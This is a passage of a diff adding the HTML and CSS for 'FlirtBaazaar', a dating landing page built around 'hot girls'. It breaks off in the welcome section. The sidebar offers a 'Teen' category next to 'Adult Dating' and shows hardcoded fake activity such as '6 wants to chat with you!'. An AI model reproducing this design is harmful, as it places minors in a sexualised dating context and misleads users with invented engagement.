@@ -1,0 +1,2050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FlirtBaazaar - India's Hottest Dating Network</title>
+    <meta name="description" content="Meet gorgeous girls online instantly! India's premier dating platform with live chat, real profiles, and instant connections. Join thousands of singles now!">
+    
+    <!-- Open Graph tags -->
+    <meta property="og:title" content="FlirtBaazaar - Meet Hot Girls Online">
+    <meta property="og:description" content="India's hottest dating network with live chat and real profiles. Start connecting now!">
+    <meta property="og:type" content="website">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(to bottom right, hsl(270, 100%, 5%), hsl(270, 100%, 10%), hsl(320, 100%, 15%));
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Glass morphism effects */
+        .glass-card {
+            background: hsla(0, 0%, 100%, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid hsla(320, 100%, 50%, 0.3);
+        }
+
+        .neon-glow {
+            box-shadow: 0 0 20px hsla(320, 100%, 50%, 0.4);
+        }
+
+        .neon-glow-sm {
+            box-shadow: 0 0 10px hsla(320, 100%, 50%, 0.3);
+        }
+
+        /* Animations */
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 20px hsla(320, 100%, 50%, 0.4); }
+            to { box-shadow: 0 0 30px hsla(320, 100%, 50%, 0.8); }
+        }
+
+        .animate-float {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .animate-pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        .animate-fade-in {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        /* Layout */
+        .container {
+            min-height: 100vh;
+            display: flex;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Floating elements */
+        .floating-elements {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+        }
+
+        .floating-dot {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.6;
+        }
+
+        .floating-dot:nth-child(1) {
+            top: 80px;
+            left: 80px;
+            width: 16px;
+            height: 16px;
+            background: #f472b6;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .floating-dot:nth-child(2) {
+            top: 160px;
+            right: 128px;
+            width: 24px;
+            height: 24px;
+            background: #c084fc;
+            animation: float 3s ease-in-out infinite 1s;
+        }
+
+        .floating-dot:nth-child(3) {
+            bottom: 160px;
+            left: 128px;
+            width: 12px;
+            height: 12px;
+            background: #f87171;
+            animation: float 3s ease-in-out infinite 2s;
+        }
+
+        .floating-dot:nth-child(4) {
+            bottom: 80px;
+            right: 80px;
+            width: 20px;
+            height: 20px;
+            background: #60a5fa;
+            animation: float 3s ease-in-out infinite 0.5s;
+        }
+
+        .floating-dot:nth-child(5) {
+            top: 240px;
+            left: 50%;
+            width: 8px;
+            height: 8px;
+            background: #fbbf24;
+            animation: float 3s ease-in-out infinite 1.5s;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 288px;
+            background: hsl(270, 100%, 10%);
+            border-right: 2px solid hsla(320, 100%, 50%, 0.2);
+            padding: 24px;
+            overflow-y: auto;
+        }
+
+        .sidebar-hidden {
+            display: none;
+        }
+
+        @media (max-width: 1024px) {
+            .sidebar {
+                display: none;
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo h2 {
+            font-size: 24px;
+            font-weight: bold;
+            color: hsl(320, 100%, 50%);
+            margin-bottom: 8px;
+        }
+
+        .logo p {
+            color: #d1d5db;
+            font-size: 14px;
+        }
+
+        /* Category items */
+        .categories {
+            margin-bottom: 24px;
+        }
+
+        .category-item {
+            background: linear-gradient(to right, rgba(168, 85, 247, 0.2), rgba(236, 72, 153, 0.2));
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .category-item:hover {
+            background: rgba(236, 72, 153, 0.3);
+            transform: scale(1.02);
+        }
+
+        .category-item.active {
+            background: rgba(236, 72, 153, 0.3);
+            transform: scale(1.05);
+        }
+
+        .category-icon {
+            font-size: 24px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
+        }
+
+        .category-text h3 {
+            font-weight: bold;
+            color: white;
+            transition: color 0.3s ease;
+            margin-bottom: 2px;
+        }
+
+        .category-item:hover .category-text h3 {
+            color: hsl(320, 100%, 50%);
+        }
+
+        .category-text p {
+            font-size: 12px;
+            color: #d1d5db;
+        }
+
+        /* Live status */
+        .live-status {
+            margin-bottom: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .live-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .live-dot {
+            width: 12px;
+            height: 12px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .live-text {
+            font-size: 14px;
+            font-weight: bold;
+            color: #22c55e;
+        }
+
+        /* Quick stats */
+        .quick-stats {
+            margin-bottom: 24px;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+        }
+
+        .stat-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stat-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Hot tip */
+        .hot-tip {
+            padding: 16px;
+            background: linear-gradient(to right, rgba(239, 68, 68, 0.2), rgba(236, 72, 153, 0.2));
+            border-radius: 12px;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .tip-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        /* Main content */
+        .main-content {
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(76, 29, 149, 0.5);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(236, 72, 153, 0.2);
+            padding: 16px;
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .search-container {
+            flex: 1;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .search-bar {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 2px solid rgba(236, 72, 153, 0.3);
+            border-radius: 25px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .search-bar::placeholder {
+            color: #999;
+            font-style: italic;
+        }
+
+        .search-bar:focus {
+            background: rgba(255, 255, 255, 1);
+            border-color: hsl(320, 100%, 50%);
+            box-shadow: 0 0 10px rgba(236, 72, 153, 0.3);
+        }
+
+        @media (max-width: 768px) {
+            .search-container {
+                max-width: 200px;
+            }
+        }
+
+        .login-btn {
+            background: linear-gradient(to right, #ec4899, #ef4444);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 20px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            box-shadow: 0 4px 15px rgba(236, 72, 153, 0.3);
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(236, 72, 153, 0.4);
+        }
+
+        @media (max-width: 640px) {
+            .login-btn {
+                padding: 10px 16px;
+                font-size: 12px;
+            }
+        }
+
+        .mobile-menu {
+            display: none;
+        }
+
+        @media (max-width: 1024px) {
+            .mobile-menu {
+                display: block;
+            }
+        }
+
+        .mobile-logo {
+            display: none;
+            font-size: 24px;
+            font-weight: bold;
+            color: hsl(320, 100%, 50%);
+        }
+
+        @media (max-width: 1024px) {
+            .mobile-logo {
+                display: block;
+            }
+        }
+
+        .header-buttons {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* Buttons */
+        .btn {
+            background: transparent;
+            border: none;
+            padding: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            box-shadow: 0 0 10px rgba(236, 72, 153, 0.3);
+        }
+
+        .btn-primary {
+            background: linear-gradient(to right, #ec4899, #ef4444);
+            color: white;
+            border-radius: 9999px;
+            padding: 16px 32px;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 0 20px rgba(236, 72, 153, 0.4);
+            transform: scale(1);
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(236, 72, 153, 0.6);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid hsl(320, 100%, 50%);
+            color: hsl(320, 100%, 50%);
+            border-radius: 9999px;
+            padding: 16px 32px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .btn-outline:hover {
+            background: rgba(236, 72, 153, 0.2);
+        }
+
+        /* Main area */
+        .main-area {
+            padding: 24px;
+            overflow-y: auto;
+            height: calc(100vh - 80px);
+        }
+
+        /* Welcome section */
+        .welcome-section {
+            margin-bottom: 32px;
+        }
+
+        .welcome-card {
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(236, 72, 153, 0.3);
+        }
+
+        .welcome-border {
+            background: linear-gradient(to right, rgba(236, 72, 153, 0.2), rgba(168, 85, 247, 0.2), rgba(239, 68, 68, 0.2));
+            padding: 1px;
+        }
+
+        .welcome-content {
+            background: hsl(270, 100%, 8%);
+            border-radius: 16px;
+            padding: 32px;
+            text-align: center;
+        }
+
+        .welcome-title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .welcome-title h1 {
+            font-size: 48px;
+            font-weight: bold;
+            background: linear-gradient(to right, #f472b6, #c084fc, #f87171);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .welcome-hearts {
+            display: flex;
+            gap: 4px;
+        }
+
+        .heart {
+            color: #ef4444;
+            animation: pulse 2s infinite;
+        }
+
+        .heart.small {
+            color: #f472b6;
+            animation-delay: 0.1s;
+        }
+
+        .welcome-subtitle {
+            font-size: 20px;
+            color: #e5e7eb;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .welcome-description {
+            font-size: 18px;
+            color: #d1d5db;
+            margin-bottom: 24px;
+        }
+
+        .online-count {
+            color: #22c55e;
+            font-weight: bold;
+        }
+
+        .features {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .feature-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .feature-dot.green { background: #22c55e; }
+        .feature-dot.blue { background: #3b82f6; }
+        .feature-dot.pink { background: #f472b6; }
+
+        .feature-text {
+            font-weight: 500;
+        }
+
+        .feature-text.green { color: #22c55e; }
+        .feature-text.blue { color: #3b82f6; }
+        .feature-text.pink { color: #f472b6; }
+
+        .cta-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        @media (min-width: 640px) {
+            .cta-buttons {
+                flex-direction: row;
+            }
+        }
+
+        /* Hot girls section */
+        .hot-girls-section {
+            margin-bottom: 32px;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: between;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .section-title h2 {
+            font-size: 32px;
+            font-weight: bold;
+            background: linear-gradient(to right, #f472b6, #ef4444);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .live-badge {
+            background: #ef4444;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+
+        .see-all-btn {
+            background: transparent;
+            border: none;
+            color: hsl(320, 100%, 50%);
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            margin-left: auto;
+        }
+
+        .see-all-btn:hover {
+            color: hsl(320, 100%, 60%);
+        }
+
+        /* Profile grid */
+        .profile-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .profile-card {
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(236, 72, 153, 0.3);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .profile-card:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 10px 30px rgba(236, 72, 153, 0.3);
+        }
+
+        .profile-image {
+            width: 100%;
+            height: 320px;
+            background: linear-gradient(to bottom right, rgba(236, 72, 153, 0.4), rgba(168, 85, 247, 0.4));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .profile-avatar {
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            background: linear-gradient(to bottom right, #f9a8d4, #ddd6fe);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            margin-bottom: 16px;
+        }
+
+        .profile-status {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .status-dot.online {
+            background: #22c55e;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.away {
+            background: #f59e0b;
+        }
+
+        .profile-info {
+            padding: 16px;
+        }
+
+        .profile-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .profile-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .profile-age {
+            color: #f472b6;
+            font-weight: 600;
+        }
+
+        .verified-badge {
+            color: #3b82f6;
+            font-size: 16px;
+        }
+
+        .profile-location {
+            color: #d1d5db;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .profile-bio {
+            color: #e5e7eb;
+            font-size: 14px;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .profile-stats {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #d1d5db;
+        }
+
+        .profile-category {
+            background: rgba(236, 72, 153, 0.2);
+            color: #f472b6;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+
+        /* Live chat section */
+        .live-chat-section {
+            margin-bottom: 32px;
+        }
+
+        .chat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+        }
+
+        .chat-card {
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .chat-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .chat-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(to bottom right, #f9a8d4, #ddd6fe);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .chat-name {
+            font-weight: bold;
+            color: white;
+            font-size: 14px;
+        }
+
+        .chat-time {
+            color: #22c55e;
+            font-size: 12px;
+            margin-left: auto;
+        }
+
+        .chat-message {
+            color: #e5e7eb;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        /* Trending section */
+        .trending-section {
+            margin-bottom: 32px;
+        }
+
+        .trending-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+
+        .trending-card {
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+        }
+
+        .trending-icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .trending-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #f472b6;
+            margin-bottom: 4px;
+        }
+
+        .trending-label {
+            color: #d1d5db;
+            font-size: 14px;
+        }
+
+        /* Floating action button */
+        .fab {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(to right, #ec4899, #ef4444);
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 8px 24px rgba(236, 72, 153, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            z-index: 1000;
+            animation: pulse 2s infinite;
+        }
+
+        .fab:hover {
+            transform: scale(1.1);
+        }
+
+        /* Notification popup */
+        .notification {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid rgba(236, 72, 153, 0.5);
+            border-radius: 12px;
+            padding: 16px;
+            max-width: 300px;
+            z-index: 1000;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .notification-hidden {
+            display: none;
+        }
+
+        .notification-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .notification-dot {
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .notification-title {
+            color: #22c55e;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .notification-message {
+            color: #e5e7eb;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        /* Login Modal */
+        .login-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .login-modal.hidden {
+            display: none;
+        }
+
+        .login-form {
+            background: linear-gradient(to bottom right, hsl(270, 100%, 8%), hsl(270, 100%, 10%));
+            border: 2px solid rgba(236, 72, 153, 0.3);
+            border-radius: 20px;
+            padding: 32px;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(236, 72, 153, 0.3);
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .login-header h2 {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(to right, #f472b6, #ef4444);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            color: #d1d5db;
+            font-size: 14px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: transparent;
+            border: none;
+            color: #999;
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-btn:hover {
+            color: #f472b6;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            color: white;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(236, 72, 153, 0.3);
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            border-color: #f472b6;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 10px rgba(236, 72, 153, 0.3);
+        }
+
+        .login-submit {
+            width: 100%;
+            background: linear-gradient(to right, #ec4899, #ef4444);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+        }
+
+        .login-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(236, 72, 153, 0.4);
+        }
+
+        .login-options {
+            text-align: center;
+        }
+
+        .login-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .login-divider::before,
+        .login-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .login-divider span {
+            padding: 0 16px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .register-link {
+            color: #f472b6;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .register-link:hover {
+            color: #ec4899;
+        }
+
+        .social-login {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 16px;
+        }
+
+        .social-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            background: transparent;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .social-btn:hover {
+            border-color: #f472b6;
+            background: rgba(244, 114, 182, 0.1);
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .main-area {
+                padding: 16px;
+            }
+
+            .welcome-title h1 {
+                font-size: 32px;
+            }
+
+            .welcome-content {
+                padding: 24px;
+            }
+
+            .section-title h2 {
+                font-size: 24px;
+            }
+
+            .features {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .profile-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .fab {
+                bottom: 16px;
+                right: 16px;
+            }
+
+            .notification {
+                top: 16px;
+                right: 16px;
+                max-width: calc(100vw - 32px);
+            }
+
+            .login-form {
+                padding: 24px;
+                margin: 16px;
+            }
+
+            .login-header h2 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating Elements -->
+    <div class="floating-elements">
+        <div class="floating-dot"></div>
+        <div class="floating-dot"></div>
+        <div class="floating-dot"></div>
+        <div class="floating-dot"></div>
+        <div class="floating-dot"></div>
+    </div>
+
+    <div class="container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <h2>💋 FlirtBaazaar</h2>
+                <p>Meet Girls Online 🔥</p>
+            </div>
+
+            <nav class="categories">
+                <div class="category-item active" onclick="selectCategory('gen-z')">
+                    <span class="category-icon">🌟</span>
+                    <div class="category-text">
+                        <h3>Gen Z</h3>
+                        <p>Young & vibrant connections</p>
+                    </div>
+                </div>
+                <div class="category-item" onclick="selectCategory('teen')">
+                    <span class="category-icon">🎓</span>
+                    <div class="category-text">
+                        <h3>Teen</h3>
+                        <p>Young & fun connections</p>
+                    </div>
+                </div>
+                <div class="category-item" onclick="selectCategory('marriage')">
+                    <span class="category-icon">💍</span>
+                    <div class="category-text">
+                        <h3>Marriage</h3>
+                        <p>Serious relationships & commitment</p>
+                    </div>
+                </div>
+                <div class="category-item" onclick="selectCategory('love-dating')">
+                    <span class="category-icon">💕</span>
+                    <div class="category-text">
+                        <h3>Love Dating</h3>
+                        <p>Romance & meaningful connections</p>
+                    </div>
+                </div>
+                <div class="category-item" onclick="selectCategory('adult-dating')">
+                    <span class="category-icon">🔥</span>
+                    <div class="category-text">
+                        <h3>Adult Dating</h3>
+                        <p>Mature connections</p>
+                    </div>
+                </div>
+            </nav>
+
+            <!-- Live Status -->
+            <div class="live-status glass-card neon-glow-sm">
+                <div class="live-indicator">
+                    <div class="live-dot"></div>
+                    <span class="live-text">LIVE NOW</span>
+                </div>
+                <p style="font-size: 14px; color: white; font-weight: 500; margin-bottom: 4px;">
+                    <span id="onlineCount">64</span> girls online
+                </p>
+                <p style="font-size: 12px; color: hsl(320, 100%, 50%); margin-bottom: 2px;">
+                    12 new messages 💬
+                </p>
+                <p style="font-size: 12px; color: #fbbf24;">6 wants to chat with you!</p>
+            </div>
+
+            <!-- Quick Stats -->
+            <div class="quick-stats">
+                <div class="stat-item glass-card">
+                    <div class="stat-left">
+                        <svg class="stat-icon" fill="none" stroke="#3b82f6" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                        </svg>
+                        <span style="font-size: 12px; color: #d1d5db;">Profile Views</span>
+                    </div>
+                    <span style="font-size: 14px; font-weight: bold; color: white;">2.4K+</span>
+                </div>
+                <div class="stat-item glass-card">
+                    <div class="stat-left">
+                        <svg class="stat-icon" fill="none" stroke="#f472b6" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                        </svg>
+                        <span style="font-size: 12px; color: #d1d5db;">New Photos</span>
+                    </div>
+                    <span style="font-size: 14px; font-weight: bold; color: #f472b6;">156</span>
+                </div>
+                <div class="stat-item glass-card">
+                    <div class="stat-left">
+                        <svg class="stat-icon" fill="none" stroke="#fbbf24" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"></path>
+                        </svg>
+                        <span style="font-size: 12px; color: #d1d5db;">Free Gifts</span>
+                    </div>
+                    <span style="font-size: 14px; font-weight: bold; color: #fbbf24;">8 available</span>
+                </div>
+            </div>
+
+            <!-- Hot Tip -->
+            <div class="hot-tip">
+                <div class="tip-header">
+                    <svg style="width: 16px; height: 16px;" fill="none" stroke="#fbbf24" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                    <span style="font-size: 12px; font-weight: bold; color: #fbbf24;">HOT TIP</span>
+                </div>
+                <p style="font-size: 12px; color: #e5e7eb;">
+                    Upload a good profile pic to get 5x more matches! 📸
+                </p>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Header -->
+            <header class="header">
+                <div class="header-content">
+                    <div style="display: flex; align-items: center; gap: 16px;">
+                        <button class="mobile-menu btn">
+                            <svg style="width: 24px; height: 24px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                            </svg>
+                        </button>
+                        <h1 class="mobile-logo">💋 FlirtBaazaar</h1>
+                    </div>
+
+                    <div class="search-container">
+                        <input type="text" class="search-bar" placeholder="Search username">
+                    </div>
+
+                    <button class="login-btn" onclick="showLogin()">Login/Register</button>
+
+                    <div class="header-buttons">
+                        <button class="btn glass-card" onclick="showLogin()">
+                            <svg style="width: 20px; height: 20px;" fill="none" stroke="hsl(320, 100%, 50%)" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
+                            </svg>
+                        </button>
+                        <button class="btn glass-card" onclick="showLogin()">
+                            <svg style="width: 20px; height: 20px;" fill="none" stroke="hsl(320, 100%, 50%)" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"></path>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Main Area -->
+            <div class="main-area">
+                <!-- Welcome Section -->
+                <section class="welcome-section animate-fade-in">
+                    <div class="welcome-card glass-card neon-glow">
+                        <div class="welcome-border">
+                            <div class="welcome-content">
+                                <div class="welcome-title">
+                                    <h1>FlirtBaazaar</h1>
+                                    <div class="welcome-hearts">
